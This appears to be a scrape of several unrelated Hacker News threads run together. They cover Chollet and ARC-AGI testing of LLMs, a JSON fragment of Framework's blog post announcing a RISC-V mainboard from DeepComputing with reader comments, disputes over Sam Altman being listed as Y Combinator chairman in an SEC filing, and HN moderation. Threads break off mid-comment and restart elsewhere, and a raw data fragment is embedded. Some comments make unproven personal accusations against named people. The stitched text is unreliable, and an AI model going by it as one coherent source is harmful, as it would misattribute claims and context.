System 1 alone does not a general intelligence make, although the article is extremely interesting in asking the question \"is System 1 plus Python enough for a general intelligence?\". But it's not a very relevant philosophical point, because Chollet's position is consistent with humans being obsoleted and/or driven extinct whether or not the LLMs are \"general intelligences\". His position is that training LLMs results in an ever-larger number of learned algorithms and no ability to construct new algorithms. This is consistent with the possibility that, after some threshold of size and training, the LLM has learned every algorithm it needs to supplant humans in (say) 99.9% of cases. (It would definitely be going out with a whimper rather than a bang, on that hypothesis, to be out-competed by something that _really is_ just a gigantic lookup table!) reply Lockal 13 hours agoparentprevThat's a big jump in generalization that bruteforcing 4 colors in 9x9 grids with 8000 programs has anything near to what sentient human can do. Back in the days similar generalization was used for Deep Blue chess computer. Computer won in 1997, but the AGI abyss is still as big. reply adroniser 19 hours agoparentprevI don't see how the point about the typical human is relevant. Either you can reason or you can't, the ARC test is supposed to be an objective way to measure this. Clearly a vanilla LLM currently cannot do this, and somehow an expert crafting a super-specific prompt is supposed to be impressive. reply eigenvalue 18 hours agorootparentThe point is that if you have some test of whether an AI is intelligent that the vast majority of living humans would fail or do worse on than gpt4-o (let alone future LLMs) then it’s not a very persuasive argument. reply biophysboy 18 hours agoparentprevI don't think he's as critical as you say. He just views LLMs as the product of intelligence rather than intelligence itself. LLM fans will say this is a false distinction, I guess. His definition of intelligence is interesting: something that can quickly achieve tasks with few priors or experience. I also think the idea of using human \"Core Knowledge\" priors is a clever way to make a test. reply imperfect_light 16 hours agoparentprevDid you listen to what Chollet said? How much of LLM improvements are due to enlarging the training sets to cover more problems and how much is due to any emergent properties? reply lassoiat 17 hours agoparentprevI am a chatGPT fan boy and have been quite impressed by 4o but I will really be impressed when it stops inventing aspects of python libraries that don't exists and instead just tells me it doesn't exist. It literally just did this for me 15 minutes ago. You can't talk about AGI when it is this easy to push it over the edge into something it doesn't know. Paper references have got better the last 12 months but just this week it made up both a book and paper for me that do not exist. The authors exist and they did not write what it said they did. It is very interesting if you ask \"do you understand your responses?\" sometimes it will say yes and sometimes it will so no not like a human understands. We should forget about AGI until it can at least say it doesn't know something. It is hardly a sign of intelligence in humans to make up answers to questions you don't know. reply motoxpro 15 hours agorootparentEvery time you’re wrong and you disagree with someone who is right you are inventing things that don’t exist. Unless you’re saying you have never held on to a wrong opinion that was at some point proven to be wrong? reply imtringued 19 hours agoparentprevYeah I agree. We have reached the end of LLMs. LLMs are infallible and require no further improvement. Anyone who points out shortcomings of current architectures and training approaches should be ignored as a naysayer. Anyone who proposes a solution to perceived flaws is a crank trying to fix something that was never broken. Everyone knows humans are incapable of internal monologues or visualization and vocalisation. Humans don't actually move their lips to speak to produce a sound that can be interpreted by a speaker of the same language, they produce universally understood tokens encoding objective reality and the fact that they use the local language is merely a habit that is hard to break out of. reply mrtranscendence 5 minutes agorootparentSometimes, when I'm undertaking the arduous work of assigning probabilities to everything I could possibly say next in a conversation, I wish that I weren't merely a stochastic autoregressive next-token generator.

One future direction for Arc AGI could be to use not Python, but a much more concise programming language that is more suited for brute-force methods like genetic mutations. The problem would be of course to train an LLM that is proficient enough in such a language. I am thinking about stack based languages. For this competition I would develop a careful bit-level encoding of a variant of the 'Joy' programming language. (https://en.wikipedia.org/wiki/Joy_(programming_language)) It would be a considerable effort though which I don't have time for, hence I post this idea publicly. A promising direction is a mix of things in my opinion: Special stack-based concise language, consulting LLMs like the OP did, and genetic algorithms combined. reply fire_lake 7 hours agoparentS expressions are great for making valid syntax more likely - an old trick from Genetic Programming. reply trott 19 hours agoprevFrançois Chollet says LLMs do not learn in-context. But Geoff Hinton says LLMs' few-shot learning compares quite favorably with people! https://www.youtube.com/watch?v=QWWgr2rN45o&t=46m20s The truth is in the middle, I think. They learn in-context, but not as well as humans. The approach in the article hides the unreliability of current LLMs by generating thousands of programs, and still the results aren't human-level.

    "title": "A new RISC-V Mainboard from DeepComputing",
    "originLink": "https://frame.work/blog/introducing-a-new-risc-v-mainboard-from-deepcomputing",
    "originBody": "Introducing a new RISC-V Mainboard from DeepComputing Hardware Jun 18 2024 by Nirav Patel We’re excited to share a preview of a Framework Laptop 13 Mainboard with a new CPU architecture today, and it’s probably not the one you think it is. The team at DeepComputing has built the first ever partner-developed Mainboard, and it uses a RISC-V processor! This is a huge milestone both for expanding the breadth of the Framework ecosystem and for making RISC-V more accessible than ever. We designed the Framework Laptop to enable deep flexibility and personalization, and now that extends all the way to processor architecture selection. DeepComputing is demoing an early prototype of this Mainboard in a Framework Laptop 13 at the RISC-V Summit Europe next week, and we’ll be sharing more as this program progresses. There is excellent philosophical alignment between RISC-V and Framework. Both are built on the idea that an open ecosystem is more powerful than the sum of its parts. To explain why, first we’ll go into what RISC-V even is. RISC-V is a fully open Instruction Set Architecture (ISA), which is the interface point between software and hardware. It’s a defined set of instructions that software is compiled and assembled into that the processor executes to run the actual program. x86 (or the latest version, x86-64) is the most common ISA for PCs today, and it’s what is used in the processors for each Framework Laptop we’ve shipped to date. The x86 ISA was invented by Intel, extended on by AMD, and is proprietary, with Intel and AMD being effectively the only two companies able to use and create processors around it. ARM is another popular ISA, owned by Arm Holdings. Arm licenses the ARM architecture out, which enables companies to pay a license fee for cores to make their own processors that leverage it. What makes RISC-V unique is that it is an entirely open architecture, which means that anyone can extend on it and create their own processors that use it without paying a fee. RISC-V International is the collaborative organization that exists to help develop the standard and define common versions to ensure cross-compatibility of hardware and software. There are hundreds of companies now developing cores and chips around RISC-V, but most of these have been hidden away in embedded applications. The DeepComputing RISC-V Mainboard is one of the first instances of leveraging this ecosystem for the main processor in a consumer-facing product. All of this is what makes RISC-V unique from an ecosystem enablement perspective. The actual technology is equally interesting. The base instruction set of RISC-V is simple and streamlined, while there are a number of extensions enabling high performance and specialized compute. This means that RISC-V cores can be developed for anything from tiny control CPUs embedded inside a sensor (the Fingerprint Reader we’ve used in Framework Laptops since 2021 actually has a RISC-V core!) to monstrous multi-hundred-core server processors. The DeepComputing RISC-V Mainboard uses a JH7110 processor from StarFive which has four U74 RISC-V cores from SiFive. SiFive is the company that developed CPU cores using the RISC-V ISA, StarFive is the processor designer that integrated those CPU cores with other peripherals, DeepComputing created a Mainboard leveraging that processor, and Framework makes laptops that can use the Mainboard. The power of an open ecosystem! This Mainboard is extremely compelling, but we want to be clear that in this generation, it is focused primarily on enabling developers, tinkerers, and hobbyists to start testing and creating on RISC-V. The peripheral set and performance aren’t yet competitive with our Intel and AMD-powered Framework Laptop Mainboards. This board also has soldered memory and uses MicroSD cards and eMMC for storage, both of which are limitations of the processor. It is a great way to start playing with RISC-V though inside of a thin, light, refined laptop. The Mainboard will be able to drop into any Framework Laptop 13 chassis or into the Cooler Master Mainboard Case. DeepComputing is also working closely with the teams at Canonical and Red Hat to ensure Linux support is solid through Ubuntu and Fedora. We’ll continue to keep you up to date as we work with the team at DeepComputing to complete development of this new Mainboard and enable access to it. You can sign up in the Framework Marketplace to get notified when we have updates. We have a couple of other updates around scaling access to Framework Laptop 13. The first is that just like we did for Framework Laptop 16 last week, today we’re sharing open source CAD for the Framework Laptop 13 shell, enabling development of skins, cases, and accessories. The second is that we now have Framework Laptop 13 Factory Seconds systems available with British English and German keyboards, making entering the ecosystem more affordable than ever. We’re eager to continue growing a new Consumer Electronics industry that is grounded in open access, repairability, and customization at every level.",

SBCs with that specific processor seem to be pretty cheap, like the Milk-V Mars which is selling for around $40 currently. The idea of a RISC-V laptop sounds cool, but this feels like just grabbing a raspberry pi and sticking it in a laptop chasis. It doesn't seem like this is going to really offer anything new in this space other than maybe some increased visibility for RISC-V (esp. if Linus Tech Tips covers it), and a neat project/option for people with existing Framework parts. As far as development purposes, I don't see what this offers over an existing SBC or even just a VM. From what I've seen of people running Linux on these things, it is definitely not something you'd want to develop on... plus, it seems like DeepCompute sells their own RISC-V laptops which are (probably) more powerful than this thing: https://store.deepcomputing.io/products/dc-roma-riscv-laptop... reply kibwen 2 hours agoparent> it's basically just a RISC-V SBC but in a Framework mainboard form-factor. As someone who's been looking for an excuse to get a Framework, I'm thrilled at the idea that if this doesn't pan out, I can just swap in a different mainboard and convert it to a full-featured x86 laptop, and then donate the RISC-V mainboard to the tinkerers at my local hackerspace (who are more than capable of 3D-printing a nice enclosure for it). reply gtirloni 57 minutes agorootparentGoing from a regular Framework mainboard with x86 to this RISC-V will be quite the drop in performance.

As for actual use the potential lies in the modularity. You could work primarily from an x86 laptop but swap the RISK-V board in for testing. And whichever board isn't currently in the laptop can be even be loaded into the small desktop shell Framework makes. If the price is right an existing Framework user could possibly get a RISC-V machine for less money than one of the dedicated laptops from DeepCompute without needing to buy another screen, keyboard, battery, etc and end up with a better build quality to boot. reply MenhirMike 2 hours agoparentprev> grabbing a raspberry pi and sticking it in a laptop chasis OT, but does something like that exist for the Pi 5? I actually loved the Pi 400 Desktop Kit (I hope they make one for the Pi 5!), and I saw quite a few laptop shells for the Pi 4, but I've not seen anything announced for the Pi 5 except for various ridiculous \"desktop\" cases (like the Pironman 5 that I've actually ordered). reply sitkack 57 minutes agorootparentWhen the CM5 module comes out, your problems will be solved. reply MenhirMike 32 minutes agorootparentGood point, the form factor of the regular isn't suited.

Or was, apparently? Seems to be out of stock and there's no restock or backorder date shown. reply craftkiller 2 hours agoprevYes! This is absolutely the right move for SBC makers. It has always bothered me that SBCs are sold as entire laptops, which were often subpar because its hard to justify an expensive screen/keyboard/shell for a single cheap underpowered SBC. Then, when you move onto the next SBC, you end up with an entire laptop of e-waste instead of just a single motherboard. Framework has already done an excellent job creating the physical/human interface, so lets just replace the brains inside of it so I can keep using the same excellent matte screen, keyboard, and touchpad and have essentially the same user experience (but with different performance). Hopefully this board can also operate in stand-alone mode outside of the framework shell just like the official framework motherboards because then we'd get the best of both worlds while also being able to benefit from the coolermaster case. Regardless, I'm going to order one when it becomes available. Also stoked to see the open source CAD files for the shell. reply mikenew 2 hours agoparentThey mentioned that it will work in the little Cooler Master standalone enclosure, so we're good on that front. And I totally agree; this is the perfect way to try out something like this. reply bee_rider 2 hours agoparentprevFor a while, it didn’t make sense to replace a CPU. Screens and hard drives were advancing around the same speed as CPUs (if not faster, the biggest advances in laptops until pretty recently were OLED screens and NVME drives). CPU competition picked up a while ago when AMD got their stuff together, but it takes time to turn the boat around, if it is actually turning. On the other hand we didn’t see laptop CPU replacement as a really mainstream thing during the 90’s/early 2000’s era when things were really going crazy. On the other other hand, everybody knew desktop PCs were the way to go for performance back then, so tinkering with laptop performance would have been a somewhat odd thing to do. Hard to speculate about or even measure, because people who tinker with hardware are in a pretty small niche already. reply cge 3 hours agoprevWhile Framework's blog post and their marketplace don't have a photo of the mainboard, Deep Computing's press release [1] does. Given the \"DC-ROMA\" name for the mainboard from DC, and their DC-ROMA laptop (not DC-ROMA II) which seems to have similar specs, I would guess that this is essentially the mainboard of that laptop, in Framework form. For context on price, DC is selling the full laptop for $300. While it's a niche product, it is great to see other companies actually developing components for the Framework platform, and more, more diverse options for components starting to appear. Yes, as people point out, this product doesn't make much sense for many people, but it doesn't have to: part of the advantage of this platform is that components don't need to appeal to a wide customer base. We are also starting to see this now with the two screen options, the speakers (choice between louder or more accurate), etc. If, as it seems, this is going to be quite low cost, I might buy one just to play around with it. It would be easy to swap with my normal mainboard, and when not in laptop form, could go in a printed enclosure. Looking at the photo, it of course has no M.2 for storage, as mentioned in the blog post (nrp explains that choice on Framework's forum [3]), but does look like it has one for the wifi card; the microSD slot is also visible. It also seems to have quite a large fan and cooling arrangement for a JH7110, compared to other boards with it? Battery on the DC-ROMA appears to have been 48 Wh [2], so not enormously smaller than Framework's 61 Wh and 55 Wh options, and battery life may be comparable plus 15% - 25%.

I feel like this has been the promise of the modern manufacturing era for so long, but it’s felt like all the momentum’s gone in the opposite direction - everyone chasing the most beige thing they can to try to get the largest market share. I’m excited to see more products and companies pushing against that trend, and it’s part of what I really appreciate about Framework - their product is absolutely a niche product and will always be, and they’re doing the hell out of it. reply nrp 2 hours agoparentprevFor context on the cooling system, it is absolutely overkill for the SoC, but to keep the project simple, DeepComputing is re-using the same heatsink and fan from our 11th Gen Intel Core Framework Laptop 13.

I'm also happy to see news like this, other companies buying into the ecosystem. The only suggestion I'd make is to get the upgraded screen (sorry, even more expensive). The default screen is OK, but it has a fairly distracting \"dot pattern\" over it in certain lights that I wish wasn't there, and the lower resolution is tough to go back to after using high-dpi displays. I'll probably get the upgraded screen at some point, but it's tough to justify buying a new screen for a brand-new laptop. Wish it had been available when I bought it, but that's life sometimes :) reply yjftsjthsd-h 1 hour agorootparentprev> once I can afford it ahaha The one downside to Framework is that they're nice laptops and (precisely because they're repairable and upgradable) they hold value really well... which means the second-hand market exists but isn't an easy way to score dirt cheap hardware. I can drop $200 on eBay and get a good thinkpad; I can't get any Framework anywhere close to that. reply cge 1 hour agorootparentA potential problem for the used market is that, as people upgrade individual components, they are left with used individual components, which are potentially harder to sell than an entire laptop. And as, so far, the major component upgrades have been of the mainboards, it seems like there could be a glut of those, while it seems possible that a used chassis may never be easily available. As more component upgrades other than motherboards become available, however, it may be that a more useful used market could develop. And it may be that building a 'used' laptop may end up usually involving buying a few new parts. For example, having, over time, upgraded the top cover, hinges, mainboard, battery, wifi card, RAM, and SSD, if I upgrade the display and camera with the soon-to-be-available new modules, I think someone could build a full laptop with my old parts, a bottom cover kit, an input cover, and some fasteners; it may be that the bottom cover (and fasteners) are the only parts there that would need to be purchased new, as I expect other people have replaced input covers (some of my keycaps are starting to degrade, but they actually degrade rather gracefully) But still, this would be more complex than simply buying a used laptop, and would need a marketplace for all of those parts. I know there was some discussion from Framework hoping someday to facilitate a used component market; that seems like it would be challenging, but on the other hand, Framework seems to have been steadily, actually pursuing the goals they have laid out. reply organsnyder 1 hour agorootparentprevEventually it should be possible to get the expensive components secondhand at good prices. It would be cool if Framework started selling a bare-bones kit where you could add your own mainboard, screen, etc. That should be possible to do now by buying parts individually, but I don't think it would be a good experience (or cost-effective). Framework does sell factory seconds for as low as $500 right now, though they need a few more components to be functional. reply jarbus 4 hours agoprev> We’re excited to share a preview of a Framework Laptop 13 Mainboard with a new CPU architecture today, and it’s probably not the one you think it is.

Please report back once you have done some field testing! reply justin_kempton 1 hour agoparentprevI also have a Framework 13! About a year ago or more I put out a request to get an ARM based processor. My reasons being the battery life on x86 are so weak, it almost defeats the mobility aspect of a laptop. I was using linux, and spent far too much time tweaking settings to get the longest battery life possible. When I compared this to a MBPro with the M1, which I use for work, it became nearly impossible to get my mind off of it. Arm processors are way better with battery. There are these new Snapdragon X Elite Laptops, which verify the better battery life. I think to be competitive with Apple, the battery life must improve. Also, the speakers are weak, likely due to none glued construction. I can live with that. Love how easy it is to swap stuff out. Screen is awesome, would love OLED if possible. Also, the bigger size 16, would better fit my needs. Currently that computer is sitting on a shelf. Very cool technology. Love Framework! reply roughly 2 hours agoparentprevHey, y’all weirdos are the ones who pave the way for the rest of us. I’m not going to buy this - I’ve got a large enough hobby project graveyard to know where I sit on the customer/nerd spectrum, but I’m stoked it exists. I like the idea of RISC-V, and the easier it is for people to develop on it, the closer it comes to being useable by upright apes like me. reply COGlory 4 hours agoprevWhat is awesome is that I can pick up one of these and put it in my existing Framework 13. reply jballanc 3 hours agoparentYes! I don't currently have a Framework 13, but this is making it reeeallly hard to hold out any longer. Yes, upgrading parts instead of buying a whole new laptop is more economical, and more environmentally friendly, but I think the real killer feature is that it has the potential to democratize new ideas around computer architecture. It sort of reminds me when you actually had a choice of whether you would set up a Token Ring or Ethernet network, before the option was taken away by the overwhelming ossification of existing hardware. reply freedomben 3 hours agorootparentI've had three FW 13s (a first-gen for myself, a second-gen for my wife, and a third-gen for myself) and I suspect you will be pretty happy with it.

In my mind this is a board to legitimise early adopters' requests, so that they can say \"hey, this doesn't run on this very real laptop from a brand that you may have heard of\". I think this is a crucial step on the way to getting an actually good experience on RISC-V based platforms. reply G3rn0ti 1 hour agoparentprevThere is already a Debian port available for RISC-V platforms including 99% of its packages: https://wiki.debian.org/RISC-V IIRC even a port of Fedora Linux. So you could use it as a daily driver already — unless you need a bit more computing power. A YouTuber made a nice video on how he edited a full episode on a RISC-V SoC using Kdenlive on Debian some time ago: https://youtu.be/7ke7d0iO_-0?si=-rjXdTxfYd_jLQuU reply sprinkly-dust 3 hours agoparentprevWell, it's not the only option so no one's being forced to buy it. The same thing could've been said about ARM laptops just 5 years ago, before the launch of M1. Now, with Windows embracing ARM for real this time, it's properly established across all major platforms. The neat thing about this specific implementation is that it can be dropped right into an existing Framework laptop — a very viable hardware platform. Thus, it will allow developers (presumably mainly on Linux) to test and iron out issues in their software, the only way to fix those software problems you speak of. It represents a strong leap forward for RISC-V and open ISAs in general. reply rbanffy 3 hours agoparentprev> what am I going to be able to do w/ a risc v board? Be the coolest kid in the block.

Currently I'm using qemu for that, but for someone who doesn't live and breath qemu it's an uphill battle. reply chrisldgk 4 hours agoparentprevIt’s not super practical yet, a lot of software won’t run on it and they even write in the article that processing power wise it will probably be worse than their x86 counterparts. As they write in the article, the point is to make developing for RISC-V more accessible so that it can find wider adoption and get over those hurdles at some point to become more mainstream. reply WhyNotHugo 3 hours agoparentprevProprietary software mostly will require emulation or other similar techniques and WILL be problematic.

Sam Altman was CEO and President. The fact he was not Chairman is not material. There's a thousand different explanations how that misstatement could have occurred. Maybe someone wrote that up, and sama didn't review every single line, and other people just assumed it was right. But it's not material. Being being the CEO and President of YC is much, much more important and more material than Chairman of the board, which is largely a figurehead position. No one is going to care and this is extreme nitpicking. They should fix the misstatement, but to claim some sort of conspiracy around this is stupid. reply joe_the_user 12 hours agoparentAs I read the statement in the article, he didn't claim he was the chairman of Y Combinator at the time he was actually President. He claimed was the chairman at the time of the filing, 2021: \"Mr. Altman is an entrepreneurial and thought leader with a proven track record of growth investing within the technology industry. He is also the co-founder and CEO of OpenAI, a leading AI research and deployment company, and the chairman of Y Combinator\" And as mentioned, \"president\" and \"chairman\" aren't fuzzy questions for the law. Saying you're one when you are the other is a lying, not \"fudging a bit\". Lying in generally, say at cocktail party, isn't against the law. But lying to the SEC is definitely a thing that can have penalties. And, yes, the article takes an appropriate \"why would you even do that?\" tone since it seems unlikely he'd get some financial or other payoff for such behavior. The main impression it gives me is of a pathological level of hubris/ego. Like a manager who j-walks in front of cop on company time. reply Maxatar 2 hours agorootparentLying is a very difficult burden to prove and requires meeting several criteria: 1. Intent to deceive, so it can't just be that the statement is false but that it was intentionally false as opposed to what is likely a mistake made by a third party. As was noted elsewhere, Sam was positioned to be Chairman of Y Combinator after stepping down as President, but that never happened. It's entirely possible that whoever wrote this did not become aware of that change in circumstances. 2. Reliance and harm. The false statement must be something that was or can be relied upon by potential investors that could cause them harm. It's possible an investor can rely on this fact but it would be very hard to demonstrate harm from it. 3. Materiality. The statement must be significant in that the information could sway a potential investor towards the investment. I'd say misstating credentials is material and so this element does count. Taken altogether however, this does seem like a whole lot of nothing. reply ABCLAW 2 hours agorootparent100% what I was going to say. This is a just a misstatement.

He’s a pretty genuine guy with a lot of advice and wisdom. He definitely doesn’t come off as a capitalist but more of a helper type — someone who helps people become whole. I felt like OpenAI and the sector in general made a lot of sense — now he can help everyone in the world. As for the issue at hand, for one it’s doubtful he prepared this, but moreover, I have seen quite a many resumes in my day and not one wasn’t padded so to speak. reply mikae1 4 hours agorootparent> He definitely doesn’t come off as a capitalist but more of a helper type A capitalist is an owner of the means of production.

It's worse than going around saying stuff, it's publishing that statement on official documents for multiple years.

What else would you be reading? reply TheDong 11 hours agorootparentYou would be reading your CFO or lawyer's summary of the important points. In this case, the only important point is probably literally just \"We filed the S-1, everything went normally\". Do you use an accountant to file your taxes? Do you read the entire tax document they submit, or do you just look at their summary of \"after this much in deductions, you owe this much\"? If you do read the document in full, good on you, but I assure you most people don't, in the same way that most CEOs don't read every single document the company's lawyer produces. reply mtnGoat 4 hours agorootparentYes I do in fact read those things, every VP or above that I know does too.

Thats the point. Not that Sam wrote it, that the organization signed off on it. reply infecto 17 hours agorootparentprevI guess I don’t see the issue. The SPAC materials are largely pointless and immaterial until an acquisition is made. Purely a guess but I would assume they put these materials together when perhaps the board position was in play.

Altman has earned a name for himself in the truth-telling/transparency department. He wasn't briefly sacked for his fashion sense.

If he had a conscience, it appears that he's sold it already. reply PretzelPirate 17 hours agoparent> The real problem is that Altman has legitimately destroyed public trust. This might seem true in our technical buble, but most of the public probably has no idea who he is. They try ChatGPT for a work task and think it's amazing and love it. I've seen this happen many times, and once one person in a small team/company tries it, everyone else starts using it and they also love it.

But make no mistake, they will switch to their own similar offering once it's up to par. reply dylan604 15 hours agorootparentprevAnd? That's the company and not him as far as what iDevice users will care about. Again, even if they bother to learn the name of the company that makes chatgpt. Hell, they might even think that is the name of the company and not the product. I don't really understand your point reply gexla 8 hours agorootparentThe upstream comment I was replying to mentioned that SAMA destroyed public trust. If this were the case, then what he had done might be enough for a massive company like Apple to hesitate on making such a deal. And there are alternative routes Apple could have taken (maybe not as good as GPT4, but close in a fast moving space.) It's true that users may not know who the company is (let alone know about SAMA) - but he does have outsized control over a company which \"isn't him.\" He had the power to reverse his sacking, make changes to the board, and is now considering changing the structure such that OpenAI is no longer a non-profit entity. Where there's smoke there's fire. You don't get to a point where you \"destroy public trust\" without also destroying investor confidence. The upstream comment mentioned \"public trust\" - but there were also trust issues with the board. These issues then put further investment in limbo until he was able to change the board. My point is, that any trust issues aren't likely what they seem given that Apple made such a large bet with the company. Sure, it's \"only\" a distribution deal. But Apple needs to know that OpenAI will continue to have access to the resources they need to continue servicing massive markets. The trust may be wobbly, but not destroyed. reply dylan604 6 hours agorootparentBut Apple's deal with OpenAI is superficial at best. It's not their entire approach to AI. You can use Apple Intelligence and not once submit something to ChatGPT. To me, that means that they are only using OpenAI as a crutch until they've improved to make it no longer necessary and/or gives them an option to swap out which ever 3rd party model is the new hotness. It's less embedded than having Google be the default search engine as ChatGPT isn't the default AI model and is absolutely opt-in with a warning message stronger than any data sharing message from anything they've offered. reply tiahura 14 hours agorootparentprevThat's what they thought with Qualcomm. reply dylan604 14 hours agorootparenti don't get the reference reply jpm_sd 22 hours agoprevSam Altman is a pathological liar https://www.theregister.com/2024/05/29/ex_openai_board_membe... https://www.wheresyoured.at/sam-altman-is-full-of-shit/ reply S_A_P 17 hours agoparentJust the sort of personality type that we need leading the most potentially dangerous new technology in the past 50 years. reply randomdata 10 hours agorootparentThe only potential danger of said technology is that it may be confused as something trusted, but as shown above, trust is a fundamentally flawed concept.

That is the nature of a decade of 0% interest rates, unprecedented in US history. If you did not get paid, it was because you were not shopping around for a buyer willing to pay more (not ascribing blame). reply Glyptodon 15 hours agorootparentprevIMO nobody highly typical reaped major returns from '2013 - 2019' unless they already had excess income. Even restricting to CS (and I haven't tracked my graduating CS classes that closely from the '08 - '11 range) my memory is that many of the smartest ones didn't end up working in CS for reasons that were never clear to me and sort of muddled by for years. (To a certain extent I'm still not sure how college grads who didn't get internships or work in the field are supposed to land their first job in the field if they're great at c and algorithms but can't and won't market themselves or move.) The only ones who made out like bandits were the ones who landed internships at places like Google or MS or had preexisting connections or niche interests of some form. A solid chunk ended up at big old companies, like IBM, Lockheed Martin, etc. They mostly made out well because getting paid $60k - $90k out of college around then made it easy to buy a house, and because they worked somewhere that made a job switch or career progression work out well enough to start getting paid more circa mid '10s. That said, a solid chunk ended up in smaller companies, government, or non-tech companies that needed devs, and I think for many of them it didn't work out or lead to years of low pay before being able to get more on track. For many, it seems like things didn't really lead to big benefits until the pandemic, which I think unlocked opportunities for more folks to work remote. Back to speaking more generally, I think many more people probably could have reaped the benefits of home ownership than did so in the '08 to '19 interval because houses seemed to stay cheap all over the country for much of that period. But many folks in the age bracket seem like they either (a) didn't realize they could afford to when houses were quite cheap, (b) actually couldn't (student loans?) or (c) were afraid to, because that whole generation never feels secure in a job or their ability to find a job if their current one cuts them, and got somewhat chilled by the foreclosures they saw in the '08 crash. Many of these folks I think only realized how this was screwing them when rents started to skyrocket, though I don't think I clearly have a sense of how student loans play out - I do think college enrollment as a percentage of high school graduates was pretty high, but I'm not sure how big a percentage of those enrolled in high cost vs low cost situations in both absolutes and loans. But IMO it's important to realize that for most typical workers in those years, median income was not high enough for single income to invest significantly beyond their house if they did save towards home ownership. The number of folks who didn't know how to find anything gainful to do with their degrees and so went back to school for master's or higher in those '08 - '11 years seems significant to me. I personally know plenty of folks who got masters degrees or better in various fields and basically eke out a living doing stuff like writing website copy, teaching at charter schools, and various other things that don't pay well and seem likely to be sort of demoralizing for someone with an advanced degree. So IMO it's only with two income households and above median incomes that you can realistically do both (invest and own housing) over those years, particularly if there are any student loans. And during those years marriage ages have gone up. The thing I'm seeing now is that folks who did get housing are kind of stuck doubling or tripling their payment to get a large place if they want to have kids, etc. Which will likely further negate many folks' ability to participate in the market. Or lead to further birth rate decline. reply anitil 17 hours agorootparentprevI'm not familiar with the whole situation - what would they be prosecuted for? Violation of copyright?

The mods suppress anything that makes YC or anything they invest in look bad reply dang 18 hours agoparentActually we moderate less, not more, when YC or a YC startup is the story. This is the #1 rule of HN moderation and has been since pg first explained it to me on the morning he started showing me how to moderate HN. If anyone wants to read about this, there are ten years' worth of past explanations here: https://hn.algolia.com/?dateRange=all&page=0&prefix=false&qu.... It looks like a mod downweighted this story but also saved it, along with your comment, for me to review. Since the rule is the rule, I'm reducing the downweight now. (Edit: I've since checked with the mod and indeed their intention was to follow the same rule - see https://news.ycombinator.com/item?id=40720026.) This looks like a flimsy story from a couple of months ago about something from many years ago. It's hard to tell if there's any there-there but, given how this sort of story usually works, the odds seem low*. It's obviously getting attention not because of intellectual curiosity (the right reason on HN) but because of celebrity outrage (a popular human pastime but not the right reason on HN). It's also repetitive of many other outrage threads we've had in recent months—an additional reason to downweight it (beyond the outrage aspect). We never let articles like this stay on HN's frontpage normally—if we did, HN would consist of little else. Still, I'm happy to reduce the downweight on this because that rule is key to the trust we have with the bulk of the community. I think most HN readers know that we moderate shallow outrage stories off the front page, and why; and I think most can appreciate that we bend that rule the other way for the sake of the above principle, even if they don't like it. It doesn't stop people from making up false claims (edit: I mean about HN moderation, like the parent comment), but it does let us answer them in good conscience, and the rest is just standard internet dynamics (sinister speculation, etc.) * Note the photo that describes Geoff as YC's \"new president\". That hasn't been the case for 5 years, and he stopped being president 18 months ago. reply zamadatix 17 hours agorootparentHey Dang, I appreciate the transparency and general policy in such situations. As well as undowning the story Do you think there will ever be in band signaling of when (or perhaps even why) a post was artificially depressed by moderation? Particularly aimed at cases where people are already using tools like https://news.social-protocols.org/stats?id=40710417 on posts like this where more people have already seen the story drop off and confirmation that it was via moderation than will probably ever see this comment in its later revival explaining how or why. Something like a \"downed\" with hover alt text next to the flag tag even. Apart from being immediately clearer to everyone without waiting for a comment/email that helps solidify against \"and then 5 hours later they back tracked it slightly but not all the way with some other excuse why after being called out\" type thinking/arguments. I mean you'll never get rid of that completely but it's a lot more powerful that the message existed there at T=30 minutes than T=5 hours. Would typically email but this seemed like something good for an open message :). reply dang 15 hours agorootparentI understand the theory—surely publishing more data would reassure everyone and help settle things—but this is based on an assumption which in my experience is false: that these dynamics are rational. I don't think that's how they work at all, so I don't have faith that earnestly publishing a moderation log would improve things. On the contrary, I find it easier to imagine it making things worse. Why? Because there would still be all the same suspicions and resentments, and now they'd have more material to work with. I'm tired and doubtful that I've expressed this very well, but I've posted quite a bit about this over the years, so if the present comment doesn't help, perhaps https://news.ycombinator.com/item?id=39234189 will, or one of the other comments linked back from there. reply zamadatix 15 hours agorootparentReading through the linked comment (and it's linked algolia feed) I'll add that public mod actions are less aimed at the making interactions with small and loud subset who will never engage rationally themselves any better and more aimed at helping the rest of the community easily ignore said subset. If the typical rational user will have seen many posts about YC critical news not related to celebrity gossip they will immediately know such claims are unfounded and have public references to it. Right now it's instead much easier to find 10 examples of this type of public comment thread where things may look gray or look at the public data analytics and find 10 examples that appear to confirm the viewpoint that topic $x articles are silently downweighted more often than they should be than it is for anyone but the mod team or those who send constant emails to provide even one bit of pre-existing hard proof to the contrary that doesn't carry the risk of looking like it was formed after the fact. Specifically on a full moderation log your links also show how it would be troublesome in some ways I perhaps hadn't thought as deeply about. After all even if you moderate 9999 things right the same crowd is going to want to parade the 1 - now with more details as to why. At the same time I still think the same set of people are going to complain either way and the data isn't really helpful to them as much as the rest of the people anyways. I realize I'm extraordinarily unlikely to budge your views on this due to volume of experience/thought/interaction with this topic you've had but just count me in the selfish \"I'd rather the log/actions were public for us average user and then your half a day of emailing was explaining the details to the troublesome bunch rather than with the average user spending time trying to understand\". I'll close with a smaller push of \"and even if the site never does a full moderation log, not signaling moderated post/comment actions at any level only feeds that small group on believing everything unpopular they say is being censored 100% of the time instead of x% of the time\". With that I'll leave you some peace on the matter :). Thanks for the time and reading through (yet another) user's view on this and for the good moderation of the site as always. reply dang 1 hour agorootparentI appreciate your reading those past explanations (you're an existence proof that people sometimes do!) and I appreciate your thoughts. They aren't unreasonable, and it's not obvious what the optimum is, so I'm also just guessing. I agree with you that the important thing is not to satisfy the litigious sort of internet user—the ones who take every attempt to satisfy them as fodder for fresh objections. It would be nice, of course, if they would take yes for an answer! and on rare occasions I've managed to pull it off, but it's really hard, and ultimately too high a bar. Rather, the important thing to satisfy the \"rest of the community\", as you put it. What I'd say to that is that the rest of the community seems to me already satisfied. Adding a new system like a moderation log wouldn't add to their satisfaction and might even diminish it. I don't mean this in a complacent way! It has not always been the case that the \"rest of the community\" was more or less satisfied, and it took years to figure out how to get there. But we did figure it out (more or less), and the approach has been stable for a long time now. It boils down to this: we answer questions when people ask them, take their concerns seriously, and acknowledge and correct mistakes when we screw up. Because we do so much of this (I spend the bulk of my time doing it, many days), regular users eventually see repeated cases of it, and this lets them know that if they ever have a concern, a question, or just a curiosity, they can get an answer too. This turned out to be by far the biggest factor in getting the HN system (community + mods + software) to be more self-regulating. What was lacking before that (mainly because pg just 